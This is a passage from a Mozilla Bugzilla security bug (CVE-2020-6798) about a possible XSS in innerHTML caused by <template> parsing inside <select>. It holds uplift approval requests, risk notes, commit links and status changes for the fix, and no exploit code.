|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1602944#c18)• 5 years ago |
|  | |

Comment on [attachment 9117223](/attachment.cgi?id=9117223 "Bug 1602944 - Move setting context to null.") [[details]](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.")

[Bug 1602944](/show_bug.cgi?id=1602944 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>") - Move setting context to null.

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: A template in select can confuse the parser, so a site that relies on the browser behaving correctly could in theory suffer XSS. However, in practice, it's unlikely that a site with proper XSS-avoidance mechanisms would be affected.
* **User impact if declined**: Small possibility of XSS.
* **Fix Landed on Version**: Not yet landed; see [comment 15](/show_bug.cgi?id=1602944#c15 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>")
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Very low risk. Nulling out a couple of fields is deferred.
* **String or UUID changes made by this patch**: None.

### Beta/Release Uplift Approval Request

* **User impact if declined**: A template in select can confuse the parser, so a site that relies on the browser behaving correctly could in theory suffer XSS. However, in practice, it's unlikely that a site with proper XSS-avoidance mechanisms would be affected.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Very low risk. Nulling out a couple of fields is deferred.
* **String changes made/needed**: None.
Flags: needinfo?(hsivonen)
[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-esr68?
[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-beta?

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1602944#c19)• 5 years ago |
|  | |

(In reply to Olli Pettay [:smaug] from [comment #14](/show_bug.cgi?id=1602944#c14 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))

> And Hsin-Yi reminded me that sec-moderate doesn't need approval :)

Not requesting sec-approval due to this.

(In reply to Olli Pettay [:smaug] from [comment #15](/show_bug.cgi?id=1602944#c15 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))

> I do think this should land to all the branches around the same time.

Requesting branch approval in advance due to this.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1602944#c20)• 5 years ago |
|  | |

Comment on [attachment 9117223](/attachment.cgi?id=9117223 "Bug 1602944 - Move setting context to null.") [[details]](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.")

[Bug 1602944](/show_bug.cgi?id=1602944 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>") - Move setting context to null.

Fixes a sec issue, approved for 73.0b5 and 68.5esr. Let's hold off on uplifting until this merges to m-c, though.

[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-esr68?
[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-esr68+
[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-beta?
[Attachment #9117223](/attachment.cgi?id=9117223&action=edit "Bug 1602944 - Move setting context to null.") -
Flags: approval-mozilla-beta+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1602944#c21)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/c7545f9cfe8f64a53400054f703b05989f90ada7>

<https://hg.mozilla.org/mozilla-central/rev/c7545f9cfe8f>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla74

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1602944#c22)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/8c63ea54dd6b>

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)
[tracking-firefox74](/buglist.cgi?f1=cf_tracking_firefox74&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1602944#c23)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/3b3f5444c547>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1602944#c24)• 5 years ago |
|  | |

<https://hg.mozilla.org/projects/htmlparser/rev/bf1dd019d127e946af4a2baeab20352eae860897>

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a3256933_458188)• 5 years ago |

Flags: qe-verify-Whiteboard: [reporter-external] [web-bounty-form] [verif?] → [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a3778169_578488)• 5 years ago |

Whiteboard: [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage] → [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage][adv-main73+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a3778453_578488)• 5 years ago |

Whiteboard: [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage][adv-main73+] → [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1602944#c25)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9122666)
— [Details](attachment.cgi?id=9122666&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a4737436_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a5333654_578488)• 5 years ago |

Alias: CVE-2020-6798

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a15327192_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a141073409_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1602944&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


